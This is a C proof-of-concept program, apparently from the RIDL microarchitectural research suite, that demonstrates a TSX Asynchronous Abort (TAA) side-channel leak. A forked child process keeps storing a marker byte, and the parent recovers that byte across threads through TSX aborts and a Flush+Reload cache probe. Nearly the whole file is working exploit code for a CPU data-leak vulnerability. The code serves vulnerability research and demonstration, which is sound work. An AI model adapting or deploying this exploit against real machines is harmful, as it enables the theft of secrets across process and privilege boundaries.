/*
Leak a cross-thread store using TSX cache-conflict aborts.

Notes:

Expected output:
$ taskset -c 3,7 ./taa_basic
0003983: 89 (?)

*/

// REVIEW ITERS?
#define ITERS 10000

#include "ridl.h"

/**
 * fork
 *     #include <sys/types.h>
 *     #include <unistd.h>
 * 
 *     pid_t fork(void);
 * 
 *     On success, the PID of the child process is returned in the parent,
 *     and 0 is returned in the child.  On failure, -1 is returned in the
 *     parent, no child process is created, and errno is set appropriately.
 */
int main(int argc, char *argv[]) {
	pid_t pid = fork();

	// Child process
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				::"r"(0x89ull));
	}
	// Parent process on failure
	if (pid < 0) return 1;

	// Parent process on success
	ALLOC_BUFFERS();

	memset(results, 0, sizeof(results));

	for (size_t i = 0; i < ITERS; ++i) {
		flush(reloadbuffer);
		tsxabort_leak_clflush(leak, reloadbuffer, reloadbuffer);
		reload(reloadbuffer, results);
	}

	print_results(results);
	kill(pid, SIGKILL);
}

